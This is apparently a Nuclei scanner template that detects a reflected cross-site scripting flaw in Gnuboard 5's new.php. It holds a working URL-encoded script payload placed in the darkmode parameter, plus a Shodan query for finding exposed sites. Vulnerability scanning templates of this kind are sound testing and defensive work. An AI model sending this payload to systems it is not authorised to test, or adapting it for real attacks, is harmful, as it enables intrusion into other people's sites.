id: gnuboard5-xss
info:
  author: arafatansari
  description: 'Gnuboard 5 is vulnerable to reflected XSS to a flaw in the clean_xss_tags()
    function called in new.php.

    '
  metadata:
    shodan-query: http.html:"gnuboard5"
    verified: true
  name: Gnuboard5 - Cross Site Scripting
  reference:
  - https://huntr.dev/bounties/ad2a9b32-fe6c-43e9-9b05-2c77c58dde6a/
  severity: medium
  tags: xss,gnuboard,gnuboard5,huntr
requests:
- matchers:
  - type: word
    words:
    - header\"><script>alert(document.domain)</script>.css?
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
